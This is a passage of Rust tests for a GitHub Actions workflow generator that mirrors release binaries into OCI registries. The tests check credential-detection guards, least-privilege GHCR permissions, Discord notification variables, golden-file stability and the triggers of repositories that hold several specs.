    // ── Discord user-id env injection ─────────────────────────────────────────

    const NOTIFY_SPEC_WITH_USER_ID: &str = r#"
name: shfmt
target:
  registry: ocx.sh
  repository: shfmt
source:
  type: github_release
  owner: mvdan
  repo: sh
  tag_pattern: "^v(?P<version>\\d+\\.\\d+\\.\\d+)$"
assets:
  linux/amd64:
    - "shfmt_v.*_linux_amd64$"
asset_type:
  type: binary
  name: shfmt
platforms:
  linux/amd64:
    runner: ubuntu-latest
notify:
  discord:
    webhook_secret: DISCORD_WEBHOOK_URL
    user_id: "123456789012345678"
"#;

    #[test]
    fn render_injects_discord_user_id_into_notify_env() {
        let spec = spec_from_yaml(NOTIFY_SPEC_WITH_USER_ID);
        let workflow = render_workflow(&spec, &root_slot());
        assert!(
            workflow.contains("OCX_MIRROR_DISCORD_USER_ID: \"123456789012345678\""),
            "notify env must inline the configured user id; workflow:\n{workflow}"
        );
        // The hook secret line and the user-id line both live in the notify env.
        assert!(workflow.contains("OCX_MIRROR_DISCORD_HOOK: ${{ secrets.DISCORD_WEBHOOK_URL }}"));
    }

    #[test]
    fn render_omits_discord_user_id_when_unset() {
        let spec = spec_from_yaml(SHFMT_SPEC);
        let workflow = render_workflow(&spec, &root_slot());
        assert!(
            !workflow.contains("OCX_MIRROR_DISCORD_USER_ID"),
            "no user-id env line when user_id is unset"
        );
        assert!(
            !workflow.contains("{DISCORD_USER_ID_ENV}"),
            "the user-id placeholder must always be substituted"
        );
    }

    // ── No-credentials guard: push job ─────────────────────────────────────────

    #[test]
    fn push_job_has_detect_credentials_step() {
        // The push job must emit a 'Detect registry credentials' step with
        // id: creds that probes OCX_MIRROR_REGISTRY_TOKEN via env-var injection
        // without echoing the secret value. The auth steps are rendered per
        // target registry, so this asserts on the rendered workflow.
        let template = workflow_of(SHFMT_SPEC);
        let template = template.as_str();
        assert!(
            template.contains("name: Detect registry credentials"),
            "push job must contain 'Detect registry credentials' step"
        );
        assert!(
            template.contains("id: creds"),
            "credentials-detect step must have id: creds"
        );
        assert!(
            template.contains("OCX_MIRROR_REGISTRY_TOKEN: ${{ secrets.OCX_MIRROR_REGISTRY_TOKEN }}"),
            "credentials-detect step must inject secret as env var (not echo it)"
        );
        assert!(
            template.contains("echo \"have=true\" >> \"${GITHUB_OUTPUT}\""),
            "credentials-detect step must set have=true output when token present"
        );
        assert!(
            template.contains("echo \"have=false\" >> \"${GITHUB_OUTPUT}\""),
            "credentials-detect step must set have=false output when token absent"
        );
        assert!(
            template.contains("::notice::No OCX_MIRROR_REGISTRY_TOKEN secret"),
            "credentials-detect step must emit a notice annotation when no secret"
        );
    }

    #[test]
    fn push_job_login_step_has_creds_guard() {
        // The docker-login step in the push job must be guarded so it is skipped
        // when no credentials are present.
        let template = workflow_of(SHFMT_SPEC);
        let template = template.as_str();
        // The login step and its guard must both be present in the workflow.
        assert!(
            template.contains("if: ${{ steps.creds.outputs.have == 'true' }}"),
            "at least one step in push job must carry if: steps.creds.outputs.have == 'true' guard"
        );
    }

    #[test]
    fn push_job_push_step_has_creds_guard() {
        // The 'Push' step (ocx-mirror package pipeline push) must also be guarded so the
        // run-summary.json is only written when credentials are available.
        let template = workflow_of(SHFMT_SPEC);
        let template = template.as_str();
        // Count occurrences: both login and push steps must have the guard.
        let guard = "if: ${{ steps.creds.outputs.have == 'true' }}";
        let count = template.matches(guard).count();
        assert!(
            count >= 2,
            "both login and push steps must carry the creds guard; found {count} occurrence(s)"
        );
    }

    #[test]
    fn push_job_has_no_creds_fallback_step() {
        // When credentials are absent the push step is skipped, so run-summary.json
        // is never written. A fallback step must emit safe defaults so the notify
        // job's conditional evaluates cleanly to false rather than erroring.
        let template = super::WORKFLOW_TEMPLATE;
        assert!(
            template.contains("id: summarise-no-creds"),
            "push job must have a fallback summarise-no-creds step"
        );
        assert!(
            template.contains("steps.creds.outputs.have != 'true'"),
            "fallback step must be guarded with steps.creds.outputs.have != 'true'"
        );
        assert!(
            template.contains("any_new_green=false"),
            "fallback step must emit any_new_green=false"
        );
        assert!(
            template.contains("any_red=false"),
            "fallback step must emit any_red=false"
        );
        assert!(
            template.contains("announce=not_run"),
            "fallback step must emit announce=not_run — the push step never ran, \
             which is not the same as the mirror never opting in"
        );
    }

    #[test]
    fn push_job_exports_the_announce_outcome_as_a_job_output() {
        // Without it, a run that published a dozen images and failed to
        // announce them is indistinguishable — to `notify` and to any branch
        // protection reading the job outputs — from one that announced. An
        // expired OCX_ANNOUNCE_TOKEN would then keep every nightly green while
        // the index drifts arbitrarily far behind the registry.
        let template = super::WORKFLOW_TEMPLATE;
        assert!(
            template.contains("announce: ${{ steps.summarise.outputs.announce }}"),
            "push job must export an `announce` output"
        );
        assert!(
            template.contains(r#"echo "announce=$(jq -r '.announce.status // "unconfigured"' run-summary.json)""#),
            "summarise must source the announce output from run-summary.json, \
             defaulting to `unconfigured` when the mirror has no announce: block"
        );
    }

    // ── No-credentials guard: describe workflow ─────────────────────────────────

    #[test]
    fn describe_workflow_has_detect_credentials_step() {
        // describe.yml must also guard the docker-login so a repo with no secrets
        // goes green on the describe job. The steps come from the shared
        // renderer, so assert on the rendered workflow, not on the template.
        let describe = describe_of(SHFMT_SPEC);
        assert!(
            describe.contains("name: Detect registry credentials"),
            "describe workflow must contain 'Detect registry credentials' step"
        );
        assert!(
            describe.contains("id: creds"),
            "describe credentials-detect step must have id: creds"
        );
        assert!(
            describe.contains("OCX_MIRROR_REGISTRY_TOKEN: ${{ secrets.OCX_MIRROR_REGISTRY_TOKEN }}"),
            "describe credentials-detect step must inject secret as env var"
        );
    }

    #[test]
    fn describe_workflow_login_and_publish_steps_have_creds_guard() {
        // Both the docker-login and the 'Publish catalog metadata' step in
        // describe.yml must carry the creds guard.
        let describe = describe_of(SHFMT_SPEC);
        let guard = "if: ${{ steps.creds.outputs.have == 'true' }}";
        let count = describe.matches(guard).count();
        assert!(
            count >= 2,
            "describe workflow must guard both login and publish steps; found {count} occurrence(s)"
        );
    }

    #[test]
    fn rendered_workflow_contains_detect_step_and_guards() {
        // End-to-end: render from a fixture and assert the generated workflow.yml
        // carries the credential-detect step and the guards.
        let dir = tempdir().unwrap();
        let result = render_fixture("mirror-minimal.yml", dir.path());
        if let Ok(()) = result {
            let workflow = dir.path().join(".github/workflows/mirror.yml");
            let content = std::fs::read_to_string(&workflow).unwrap();
            assert!(
                content.contains("Detect registry credentials"),
                "rendered mirror.yml must contain 'Detect registry credentials' step"
            );
            assert!(
                content.contains("id: creds"),
                "rendered mirror.yml must contain 'id: creds'"
            );
            assert!(
                content.contains("steps.creds.outputs.have == 'true'"),
                "rendered mirror.yml must contain creds guard on login/push steps"
            );
            assert!(
                content.contains("summarise-no-creds"),
                "rendered mirror.yml must contain no-creds fallback summarise step"
            );
        }
    }

    #[test]
    fn rendered_workflow_prepare_consumes_plan_artifact() {
        // Regression (issue #160): the prepare matrix legs must consume the
        // plan artifact (`--plan plan.json`) instead of re-running the source
        // generator — N+1 concurrent crawls exhausted the GitHub GraphQL
        // points budget. discover uploads the plan; prepare downloads it.
        let dir = tempdir().unwrap();
        let result = render_fixture("mirror-minimal.yml", dir.path());
        if let Ok(()) = result {
            let workflow = dir.path().join(".github/workflows/mirror.yml");
            let content = std::fs::read_to_string(&workflow).unwrap();
            assert!(
                content.contains("name: plan\n          path: plan.json"),
                "discover must upload plan.json as the 'plan' artifact"
            );
            assert!(
                content.contains("--plan plan.json"),
                "prepare must pass --plan plan.json so the source is never re-crawled"
            );
            assert!(
                content.contains(
                    "jq -c '[.versions[] | select(.kind != \"metadata-drift\") | {version, platforms, kind}]'"
                ),
                "versions output must be projected so asset URLs stay out of the matrix JSON, \
                 and must drop metadata-drift entries — they carry no assets, so a prepare leg \
                 for one aborts on `carries no resolved assets` whenever some other version in \
                 the same run is genuinely new"
            );
        }
    }

    #[test]
    fn rendered_describe_contains_detect_step_and_guards() {
        // End-to-end: render from a fixture and assert the generated describe.yml
        // carries the credential-detect step and the guards.
        let dir = tempdir().unwrap();
        let result = render_fixture("mirror-minimal.yml", dir.path());
        if let Ok(()) = result {
            let describe = dir.path().join(".github/workflows/describe.yml");
            let content = std::fs::read_to_string(&describe).unwrap();
            assert!(
                content.contains("Detect registry credentials"),
                "rendered describe.yml must contain 'Detect registry credentials' step"
            );
            assert!(
                content.contains("steps.creds.outputs.have == 'true'"),
                "rendered describe.yml must guard both login and publish steps"
            );
            let guard = "steps.creds.outputs.have == 'true'";
            let count = content.matches(guard).count();
            assert!(
                count >= 2,
                "rendered describe.yml must have guard on both login and publish steps; found {count}"
            );
        }
    }

    // ── GHCR target: login path + package write permission (E-P4) ──────────

    const GHCR_SPEC: &str = r#"
name: bazelisk
target:
  registry: ghcr.io
  repository: ocx-contrib/bazelbuild/bazelisk
source:
  type: github_release
  owner: bazelbuild
  repo: bazelisk
  tag_pattern: "^v(?P<version>\\d+\\.\\d+\\.\\d+)$"
assets:
  linux/amd64:
    - "bazelisk-linux-amd64$"
asset_type:
  type: binary
  name: bazelisk
tests:
  - name: version
    command: bazelisk --version
platforms:
  linux/amd64:
    runner: ubuntu-latest
announce:
  package: bazelbuild/bazelisk
  fork: ocx-contrib/index
"#;

    #[test]
    fn ghcr_push_job_grants_every_scope_its_steps_need() {
        // Declaring ANY permission sets every unnamed scope to `none`, so this
        // block is the whole token for the push job and a missing line is a
        // revoked capability, not a default. Asserted as one exact block —
        // checking only `packages: write` would have passed against the version
        // that silently revoked the other three.
        //
        // Per step:
        //   contents: read       — actions/checkout, setup-ocx
        //   packages: write      — docker login ghcr.io + `ocx package push`
        //   actions: read        — `gh api …/runs/N/jobs` for OCX_MIRROR_JOB_URL,
        //                          whose `|| true` swallows a 403 and silently
        //                          drops the link from every Discord row
        //   checks: write        — publish-unit-test-result-action's check run
        //   pull-requests: write — the same action's PR comment; without the
        //                          pair it 403s under `if: always()` and reds
        //                          the job on a perfectly successful publish
        // download-artifact / upload-artifact use the runtime token for
        // same-run artifacts and need no scope here; the announce authenticates
        // with OCX_ANNOUNCE_TOKEN, not with GITHUB_TOKEN.
        let workflow = workflow_of(GHCR_SPEC);

        assert!(
            workflow.contains(
                "    permissions:\n\
                 \x20     contents: read\n\
                 \x20     packages: write\n\
                 \x20     actions: read\n\
                 \x20     checks: write\n\
                 \x20     pull-requests: write\n"
            ),
            "ghcr.io push job must grant exactly the scopes its steps need, got:\n{workflow}"
        );
    }

    #[test]
    fn ghcr_target_logs_in_with_github_token() {
        let workflow = workflow_of(GHCR_SPEC);

        assert!(
            workflow.contains("      packages: write\n"),
            "a ghcr.io push job must declare packages: write, got:\n{workflow}"
        );
        assert!(
            workflow.contains("docker login ghcr.io"),
            "ghcr.io target must log in to ghcr.io, got:\n{workflow}"
        );
        assert!(
            workflow.contains(r#"-u "${{ github.actor }}""#),
            "ghcr.io login must use the run's own actor, got:\n{workflow}"
        );
        // The shared OCX_MIRROR_REGISTRY_* org secrets carry ocx.sh credentials
        // used by every other mirror repo. Repurposing them for GHCR would
        // break all of them.
        assert!(
            !workflow.contains("OCX_MIRROR_REGISTRY_TOKEN"),
            "ghcr.io path must not touch the shared ocx.sh registry secrets, got:\n{workflow}"
        );
        assert!(
            !workflow.contains("OCX_MIRROR_REGISTRY_USER"),
            "ghcr.io path must not touch the shared ocx.sh registry secrets, got:\n{workflow}"
        );
    }

    #[test]
    fn ghcr_target_is_always_credentialed_so_the_push_never_silently_skips() {
        // GITHUB_TOKEN is present on every run. If the probe kept testing for
        // OCX_MIRROR_REGISTRY_TOKEN, every GHCR push would take the "no creds"
        // branch and skip while still reporting success.
        let workflow = workflow_of(GHCR_SPEC);

        assert!(
            workflow.contains("run: echo \"have=true\" >> \"${GITHUB_OUTPUT}\"\n"),
            "ghcr.io credential probe must be a constant have=true, got:\n{workflow}"
        );
        assert!(
            !workflow.contains("have=false"),
            "ghcr.io workflow must have no no-credentials branch, got:\n{workflow}"
        );
    }

    /// The `discover:` job only, so a push-job step cannot satisfy an
    /// assertion about discover.
    fn discover_job(workflow: &str) -> String {
        let start = workflow.find("\n  discover:").expect("workflow has a discover job");
        let rest = &workflow[start + 1..];
        let end = rest.find("\n  prepare:").expect("workflow has a prepare job");
        rest[..end].to_string()
    }

    #[test]
    fn ghcr_discover_authenticates_so_a_first_publish_can_bootstrap() {
        // ghcr.io answers an anonymous read of a missing repository with 403
        // DENIED, not 404. `list_target_tags` only treats an authoritative
        // not-found as an empty target (issue #157), so an unauthenticated
        // discover aborts the run before the push that would create the
        // package — the target could never come into existence.
        let discover = discover_job(&workflow_of(GHCR_SPEC));

        assert!(
            discover.contains("docker login ghcr.io"),
            "a ghcr.io discover job must log in, got:\n{discover}"
        );
        assert!(
            discover.contains("      packages: read\n"),
            "a ghcr.io discover job must grant packages: read, got:\n{discover}"
        );
        assert!(
            discover.contains("      contents: read\n"),
            "naming any permission zeroes the rest — checkout still needs contents: read, got:\n{discover}"
        );
        // Discover reads; only the push job writes.
        assert!(
            !discover.contains("packages: write"),
            "discover must not ask for write access, got:\n{discover}"
        );
    }

    #[test]
    fn non_ghcr_discover_stays_anonymous_and_unprivileged() {
        // A public ocx.sh target lists tags anonymously, and the shared
        // OCX_MIRROR_REGISTRY_* secrets stay confined to the push job.
        let discover = discover_job(&workflow_of(SHFMT_SPEC));

        assert!(
            !discover.contains("docker login"),
            "a non-GHCR discover job must not log in, got:\n{discover}"
        );
        assert!(
            !discover.contains("permissions:"),
            "a non-GHCR discover job keeps the repository default scopes, got:\n{discover}"
        );
    }

    #[test]
    fn ghcr_describe_logs_in_with_the_run_token_not_the_ocx_sh_secrets() {
        // `describe` pushes the catalog metadata as an `__ocx.desc` referrer on
        // the target. Switching the target host to ghcr.io without switching
        // the credential left it feeding ocx.sh org-secret credentials to
        // ghcr.io — a login that cannot succeed, and a scope the job never got.
        let describe = describe_of(GHCR_SPEC);

        assert!(
            describe.contains("docker login ghcr.io"),
            "a ghcr.io describe job must log in to ghcr.io, got:\n{describe}"
        );
        assert!(
            describe.contains(r#"-u "${{ github.actor }}""#),
            "a ghcr.io describe job must use the run's own actor, got:\n{describe}"
        );
        assert!(
            !describe.contains("secrets.OCX_MIRROR_REGISTRY_"),
            "the ocx.sh org secrets must not reach a ghcr.io describe job, got:\n{describe}"
        );
        assert!(
            describe.contains("      packages: write\n") && describe.contains("      contents: read\n"),
            "a ghcr.io describe job writes a referrer, so it needs packages: write plus contents: read for checkout, got:\n{describe}"
        );
    }

    #[test]
    fn non_ghcr_describe_keeps_the_org_secret_login_and_adds_no_permissions() {
        let describe = describe_of(SHFMT_SPEC);

        assert!(
            describe.contains("docker login ocx.sh"),
            "an ocx.sh describe job keeps its own login, got:\n{describe}"
        );
        assert!(
            describe.contains(r#"-u "${{ secrets.OCX_MIRROR_REGISTRY_USER }}""#),
            "an ocx.sh describe job keeps the org-secret credentials, got:\n{describe}"
        );
        assert!(
            !describe.contains("permissions:"),
            "a non-GHCR describe job keeps the repository default scopes, got:\n{describe}"
        );
    }

    #[test]
    fn non_ghcr_target_keeps_the_registry_secret_login_and_adds_no_permissions() {
        let workflow = workflow_of(SHFMT_SPEC);

        assert!(
            workflow.contains("docker login ocx.sh"),
            "ocx.sh target must keep its own login, got:\n{workflow}"
        );
        assert!(
            workflow.contains(r#"-u "${{ secrets.OCX_MIRROR_REGISTRY_USER }}""#),
            "ocx.sh target must keep the org-secret credentials, got:\n{workflow}"
        );
        assert!(
            !workflow.contains("packages: write"),
            "a non-GHCR push job needs no extra token scope, got:\n{workflow}"
        );
        assert!(
            !workflow.contains("docker login ghcr.io"),
            "ocx.sh target must not log in to ghcr.io, got:\n{workflow}"
        );
    }

    #[test]
    fn push_step_carries_the_announce_token() {
        // The announce happens inside `ocx-mirror package pipeline push`, so
        // the token has to reach that step's env — there is no separate job.
        for spec in [SHFMT_SPEC, GHCR_SPEC] {
            let workflow = workflow_of(spec);
            assert!(
                workflow.contains("OCX_ANNOUNCE_TOKEN: ${{ secrets.OCX_ANNOUNCE_TOKEN }}"),
                "push step must carry OCX_ANNOUNCE_TOKEN, got:\n{workflow}"
            );
        }
    }

    #[test]
    fn every_placeholder_is_substituted_for_both_registries() {
        for spec in [SHFMT_SPEC, GHCR_SPEC] {
            let workflow = workflow_of(spec);
            assert!(
                !workflow.contains("{PUSH_PERMISSIONS}") && !workflow.contains("{REGISTRY_AUTH_STEPS}"),
                "unsubstituted placeholder in:\n{workflow}"
            );
        }
    }

    #[test]
    fn a_cross_owner_ghcr_target_is_warned_about_at_generate_time() {
        // GITHUB_TOKEN authorises packages under its own repository's owner.
        // `docker login ghcr.io` succeeds regardless — login does not
        // authorise — and the GHCR credential probe is a constant `have=true`,
        // so a cross-owner target has no honest skip: the push just reds with
        // `denied: installation not allowed to Create organization package`.
        let spec = spec_from_yaml(GHCR_SPEC); // target owner: ocx-contrib
        assert!(ghcr_owner_warning(&spec, Some("ocx-contrib/mirror-bazelisk")).is_none());
        assert!(
            ghcr_owner_warning(&spec, Some("OCX-Contrib/mirror-bazelisk")).is_none(),
            "GHCR owners are case-insensitive"
        );
        assert!(
            ghcr_owner_warning(&spec, None).is_none(),
            "generate cannot always know the remote — unknown owner must stay quiet"
        );
        assert!(
            ghcr_owner_warning(&spec_from_yaml(SHFMT_SPEC), Some("someone-else/x")).is_none(),
            "a non-GHCR target authenticates with an org secret, not with repo ownership"
        );

        let warning =
            ghcr_owner_warning(&spec, Some("someone-else/mirror-bazelisk")).expect("cross-owner target must warn");
        assert!(warning.contains("ocx-contrib"), "got: {warning}");
        assert!(warning.contains("someone-else"), "got: {warning}");
    }

    #[test]
    fn the_run_summary_artifact_carries_the_announce_tags_file() {
        // The tags file is the exact `--tags-from-file` the index call received.
        // Uploading only run-summary.json leaves nothing to reconstruct a
        // failed announce from.
        let workflow = workflow_of(GHCR_SPEC);

        assert!(
            workflow
                .contains("          path: |\n            run-summary.json\n            run-summary.announce-tags\n"),
            "the run-summary artifact must carry the announce tags file, got:\n{workflow}"
        );
    }

    #[test]
    fn ghcr_announce_fixture_renders_end_to_end() {
        // The inline specs above bypass `load_spec`. This one goes through it,
        // so the fixture also proves the `announce:` block survives
        // deny_unknown_fields and spec validation on the way to a written file.
        let dir = tempdir().unwrap();
        render_fixture("mirror-ghcr-announce.yml", dir.path()).expect("ghcr + announce fixture must render");

        let content = std::fs::read_to_string(dir.path().join(".github/workflows/mirror.yml")).unwrap();
        assert!(content.contains("packages: write"), "got:\n{content}");
        assert!(content.contains("docker login ghcr.io"), "got:\n{content}");
        assert!(
            content.contains("OCX_ANNOUNCE_TOKEN: ${{ secrets.OCX_ANNOUNCE_TOKEN }}"),
            "got:\n{content}"
        );
    }

    // ── Zero-drift guard for the native corpus ────────────────────────────────

    /// Every fixture that renders successfully and declares no `containers:`.
    ///
    /// These stand in for the ~40 pinned mirror repositories in the wild: their
    /// generated workflows are committed and guarded by `verify-generated.yml`,
    /// so any renderer change that shifts a single byte turns every one of them
    /// red on its next run. Adding a fixture here is deliberate friction — a new
    /// native fixture needs a new golden.
    const NATIVE_FIXTURES: &[&str] = &[
        "mirror-minimal.yml",
        "mirror-full-platforms.yml",
        "mirror-ghcr-announce.yml",
        "mirror-generator-source.yml",
        "mirror-two-platform-announce.yml",
        "mirror-windows-arm64.yml",
        "mirror-all-test-kinds.yml",
        "mirror-variants.yml",
    ];

    /// Render every generated file for `fixture` into one comparable blob,
    /// with the build-stamped header values masked.
    ///
    /// `VERSION` bumps each release and `GIT_SHA_SHORT` changes on every commit,
    /// so both are replaced by fixed tokens — masking the stamps is what lets the
    /// golden assert on the parts a renderer change can actually break.
    fn render_all_masked(fixture: &str) -> String {
        let dir = tempdir().unwrap();
        render_fixture(fixture, dir.path()).unwrap_or_else(|e| panic!("{fixture} must render: {e}"));

        let workflows = dir.path().join(".github/workflows");
        let mut entries: Vec<_> = std::fs::read_dir(&workflows)
            .expect("renderer must write .github/workflows")
            .map(|e| e.unwrap().path())
            .collect();
        entries.sort();

        let mut blob = String::new();
        for path in entries {
            let name = path.file_name().unwrap().to_string_lossy().into_owned();
            let content = std::fs::read_to_string(&path).unwrap();
            blob.push_str(&format!("===== {name} =====\n"));
            blob.push_str(&content.replace(VERSION, "{VERSION}").replace(GIT_SHA_SHORT, "{REV}"));
        }
        blob
    }

    #[test]
    fn native_specs_render_byte_identically_to_their_goldens() {
        // The single assertion that protects the pinned mirror corpus: a spec
        // without `containers:` must render exactly the bytes it renders today.
        // Regenerate deliberately with `UPDATE_GOLDEN=1 cargo test -p ocx-mirror`
        // and read the diff before committing it.
        let golden_dir = Path::new(concat!(env!("CARGO_MANIFEST_DIR"), "/tests/golden"));
        for fixture in NATIVE_FIXTURES {
            let rendered = render_all_masked(fixture);
            let golden_path = golden_dir.join(format!("{}.txt", fixture.trim_end_matches(".yml")));

            if std::env::var_os("UPDATE_GOLDEN").is_some() {
                std::fs::create_dir_all(golden_dir).unwrap();
                std::fs::write(&golden_path, &rendered).unwrap();
                continue;
            }

            let golden = std::fs::read_to_string(&golden_path).unwrap_or_else(|e| {
                panic!(
                    "missing golden {} for {fixture} ({e}); regenerate with UPDATE_GOLDEN=1",
                    golden_path.display()
                )
            });
            assert_eq!(
                rendered, golden,
                "{fixture} drifted from its golden — every pinned mirror repo \
                 rendering a native spec would see this change"
            );
        }
    }

    // ── Multi-spec repositories ───────────────────────────────────────────────

    /// A repository holding a root spec and a nested one, rendered.
    ///
    /// `mirror-ghcr-announce.yml` is the nested spec because it also emits an
    /// `announce-from-registry` workflow, so the suffixing is exercised on all
    /// three per-spec files rather than just two.
    fn two_spec_repo(dir: &Path) -> Vec<PathBuf> {
        let root = install_spec("mirror-minimal.yml", dir);
        let nested = install_spec_at("mirror-ghcr-announce.yml", dir, "py3.13/mirror.yml");
        vec![root, nested]
    }

    fn workflows_in(dir: &Path) -> Vec<String> {
        let mut names: Vec<String> = std::fs::read_dir(dir.join(".github/workflows"))
            .expect("renderer must write .github/workflows")
            .map(|entry| entry.unwrap().file_name().to_string_lossy().into_owned())
            .collect();
        names.sort();
        names
    }

    #[test]
    fn two_specs_render_two_workflow_sets_and_one_drift_guard() {
        // The bug repeatable `--spec` exists to fix: rendering the second spec
        // used to overwrite the first, because every filename was fixed.
        let dir = tempdir().unwrap();
        let specs = two_spec_repo(dir.path());
        generate(dir.path(), &specs, false).expect("two specs must render");

        assert_eq!(
            workflows_in(dir.path()),
            vec![
                "announce-from-registry-py3.13.yml",
                "cascade-py3.13.yml",
                "cascade.yml",
                "describe-py3.13.yml",
                "describe.yml",
                "mirror-py3.13.yml",
                "mirror.yml",
                "patch-py3.13.yml",
                "patch.yml",
                "verify-generated.yml",
            ],
            "each spec owns a workflow set named after its directory, and the \
             repository owns exactly one drift guard"
        );

        generate(dir.path(), &specs, true).expect("--check must be green right after a render");
    }

    #[test]
    fn spec_argument_order_does_not_change_what_is_rendered() {
        // Output that depended on argument order would make the drift guard —
        // which passes the specs in one fixed order — red for anyone who typed
        // them differently.
        let forward = tempdir().unwrap();
        let reverse = tempdir().unwrap();
        let mut specs = two_spec_repo(forward.path());
        generate(forward.path(), &specs, false).unwrap();

        let mut reversed = two_spec_repo(reverse.path());
        reversed.reverse();
        generate(reverse.path(), &reversed, false).unwrap();

        specs.sort();
        for name in workflows_in(forward.path()) {
            let a = std::fs::read_to_string(forward.path().join(".github/workflows").join(&name)).unwrap();
            let b = std::fs::read_to_string(reverse.path().join(".github/workflows").join(&name)).unwrap();
            assert_eq!(a, b, "{name} differs when the specs are passed in the other order");
        }
    }

    #[test]
    fn a_nested_spec_names_itself_in_every_generated_invocation() {
        // Without `--spec`, every pipeline command in the nested spec's
        // workflows would fall back to the repo-root `mirror.yml` and mirror
        // the wrong tool while looking perfectly green.
        let dir = tempdir().unwrap();
        generate(dir.path(), &two_spec_repo(dir.path()), false).unwrap();

        let read = |name: &str| std::fs::read_to_string(dir.path().join(".github/workflows").join(name)).unwrap();

        let mirror = read("mirror-py3.13.yml");
        for command in ["plan", "prepare", "push"] {
            assert!(
                mirror.contains(&format!("pipeline {command} --spec py3.13/mirror.yml")),
                "`pipeline {command}` must name its own spec, got:\n{mirror}"
            );
        }
        assert!(
            read("describe-py3.13.yml").contains("pipeline describe --spec py3.13/mirror.yml"),
            "describe must name its own spec"
        );
        assert!(
            read("announce-from-registry-py3.13.yml").contains("pipeline announce --spec py3.13/mirror.yml --dry-run"),
            "announce must name its own spec"
        );
        assert!(
            read("patch-py3.13.yml").contains("pipeline patch --spec py3.13/mirror.yml --metadata-only"),
            "patch must name its own spec"
        );
        assert!(
            read("cascade-py3.13.yml").contains("pipeline cascade --spec py3.13/mirror.yml --dry-run"),
            "cascade must name its own spec"
        );

        // The root spec is the one path `--spec` already defaults to, so it
        // stays unsaid — that is what keeps the published corpus byte-identical.
        let root = read("mirror.yml");
        assert!(
            !root.contains("--spec"),
            "the repo-root spec must not name itself, got:\n{root}"
        );
    }

    #[test]
    fn a_nested_spec_triggers_only_on_its_own_subtree() {
        // Repo-wide triggers would wake every spec's workflow on every commit —
        // forty mirror runs for a one-line change in one subdirectory.
        let dir = tempdir().unwrap();
        generate(dir.path(), &two_spec_repo(dir.path()), false).unwrap();

        let nested = std::fs::read_to_string(dir.path().join(".github/workflows/mirror-py3.13.yml")).unwrap();
        assert!(
            nested.contains("      - py3.13/**\n      - .github/workflows/mirror-py3.13.yml\n"),
            "a nested spec watches its own subtree and its own workflow, got:\n{nested}"
        );
        // `script:` resolves from the repo root while this trigger covers only
        // the subtree — the gap has to be stated where it bites.
        assert!(
            nested.contains("# `script:` paths resolve from the repository root, not from py3.13/"),
            "the subtree trigger must warn about repo-root-relative script paths, got:\n{nested}"
        );
        // That note is injected *inside* a YAML sequence, so a string assertion
        // cannot see whether it corrupted the sequence. Parsing can.
        let parsed: serde_yaml_ng::Value = serde_yaml_ng::from_str(&nested)
            .unwrap_or_else(|e| panic!("a nested spec must render parseable YAML: {e}\n{nested}"));
        let paths = parsed["on"]["push"]["paths"]
            .as_sequence()
            .unwrap_or_else(|| panic!("push.paths must survive as a sequence, got:\n{nested}"));
        assert_eq!(
            paths.iter().map(|p| p.as_str().unwrap()).collect::<Vec<_>>(),
            vec!["py3.13/**", ".github/workflows/mirror-py3.13.yml"],
            "the comment must not become an entry"
        );
        assert!(
            !nested.contains("- scripts/**"),
            "a nested spec must not claim the repository-wide paths, got:\n{nested}"
        );

        let describe = std::fs::read_to_string(dir.path().join(".github/workflows/describe-py3.13.yml")).unwrap();
        assert!(
            describe.contains("      - py3.13/**\n      - .github/workflows/describe-py3.13.yml\n"),
            "got:\n{describe}"
        );
        assert!(
            describe.contains("name: describe-py3.13\n"),
            "sibling describes need distinct workflow names — `concurrency.group` keys \
             on `github.workflow`, so identical names would serialise them, got:\n{describe}"
        );
    }

    // ── Shared `extends:` bases ───────────────────────────────────────────────

    /// The shared base of a multi-spec repository: everything the packages have
    /// in common and nothing that identifies one of them.
    const EXTENDS_BASE: &str = r#"
platforms:
  linux/amd64:
    runner: ubuntu-latest
build_timestamp: none
cascade: true
"#;

    /// One package spec of such a repository.
    ///
    /// With `extends`, the platform matrix comes from the base; without, the
    /// same keys are inlined — so the two render the same workflow apart from
    /// the trigger, which is what makes the absent-base assertion meaningful.
    fn extends_child(name: &str, extends: Option<&str>) -> String {
        let body = format!(
            r#"name: {name}
target:
  registry: ocx.sh
  repository: {name}
source:
  type: github_release
  owner: bazelbuild
  repo: buildtools
  tag_pattern: "^v(?P<version>\\d+\\.\\d+\\.\\d+)$"
assets:
  linux/amd64:
    - "{name}-linux-amd64$"
asset_type:
  type: binary
  name: {name}
tests:
  - name: version
    command: {name} --version
"#
        );
        match extends {
            Some(base) => format!("extends: {base}\n{body}"),
            None => format!("{body}{EXTENDS_BASE}"),
        }
    }

    /// Write `content` at `relative` under `dir`, creating parents.
    fn write_file(dir: &Path, relative: &str, content: &str) -> PathBuf {
        let dest = dir.join(relative);
        std::fs::create_dir_all(dest.parent().unwrap()).unwrap();
        std::fs::write(&dest, content).unwrap();
        dest
    }

    /// The `on.<event>.paths` sequence of a rendered workflow.
    ///
    /// Parsed rather than string-matched: the entries share their block with a
    /// generated comment, and only a parser can tell an entry from a note.
    fn trigger_entries(workflow: &str, event: &str) -> Vec<String> {
        let parsed: serde_yaml_ng::Value = serde_yaml_ng::from_str(workflow)
            .unwrap_or_else(|e| panic!("a rendered workflow must parse: {e}\n{workflow}"));
        parsed["on"][event]["paths"]
            .as_sequence()
            .unwrap_or_else(|| panic!("on.{event}.paths must be a sequence, got:\n{workflow}"))
            .iter()
            .map(|entry| entry.as_str().expect("path entries are strings").to_string())
            .collect()
    }

    #[test]
    fn a_spec_that_extends_a_base_triggers_on_that_base() {
        // The shared base sits above every child's subtree, so the subtree
        // trigger cannot see it: editing the platform matrix there changed what
        // every package publishes and re-ran nothing.
        let workflows_for = |extends: Option<&str>| -> (String, String) {
            let dir = tempdir().unwrap();
            write_file(dir.path(), "mirror-base.yml", EXTENDS_BASE);
            let child = write_file(
                dir.path(),
                "buildifier/mirror.yml",
                &extends_child("buildifier", extends),
            );
            generate(dir.path(), &[child], false).expect("the child spec must render");
            let read = |name: &str| std::fs::read_to_string(dir.path().join(".github/workflows").join(name)).unwrap();
            (read("mirror-buildifier.yml"), read("describe-buildifier.yml"))
        };

        let (mirror, describe) = workflows_for(Some("../mirror-base.yml"));
        assert_eq!(
            trigger_entries(&mirror, "push"),
            vec![
                "buildifier/**",
                "mirror-base.yml",
                ".github/workflows/mirror-buildifier.yml"
            ],
            "a spec watches its own subtree, every base it extends, and its own workflow, got:\n{mirror}"
        );
        assert_eq!(
            trigger_entries(&describe, "push"),
            vec![
                "buildifier/**",
                "mirror-base.yml",
                ".github/workflows/describe-buildifier.yml"
